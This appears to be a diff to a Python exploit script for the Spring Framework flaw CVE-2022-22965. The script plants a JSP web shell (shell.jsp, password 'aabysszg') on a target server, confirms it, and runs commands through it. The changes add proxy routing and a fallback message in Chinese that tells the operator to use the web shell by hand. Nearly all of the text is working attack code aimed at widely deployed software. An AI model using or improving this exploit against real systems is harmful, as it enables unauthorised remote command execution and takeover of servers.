@@ -41,7 +41,7 @@ def CVE_2022_22965(url, proxies):
     getpayload = url + payload_http
     try:
         requests.packages.urllib3.disable_warnings()
-        requests.post(url, headers=Headers_2, data=file_date_data, verify=False)
+        requests.post(url, headers=Headers_2, data=file_date_data, verify=False, proxies=proxies)
         requests.post(url, headers=Headers_2, data=payload_other, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         requests.post(url, headers=Headers_1, data=payload_linux, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
@@ -49,7 +49,6 @@ def CVE_2022_22965(url, proxies):
         sleep(0.5)
         requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        requests.get(url, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         test = requests.get(url + "shell.jsp", verify=False, proxies=proxies)
         test_again = requests.get(url + "shell.jsp", verify=False, proxies=proxies)
         if (test.status_code == 500) or (test_again.status_code == 200):
@@ -61,9 +60,13 @@ def CVE_2022_22965(url, proxies):
                 url_shell = url + "shell.jsp?pwd=aabysszg&cmd={}".format(Cmd)
                 r = requests.get(url_shell, verify=False, proxies=proxies)
                 r_again = requests.get(url_shell, verify=False, proxies=proxies)
-                resp = r_again.text
-                result = re.findall('([^\x00]+)\n', resp)[0]
-                cprint(result ,"green")
+                if r_again.status_code == 500:
+                    cprint("[-] 重发包返回状态码500，请手动尝试利用WebShell：shell.jsp?pwd=aabysszg&cmd=whoami\n","yellow")
+                    break
+                else:
+                    resp = r_again.text
+                    result = re.findall('([^\x00]+)\n', resp)[0]
+                    cprint(result ,"green")
         else:
             cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/shell.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
     except KeyboardInterrupt:
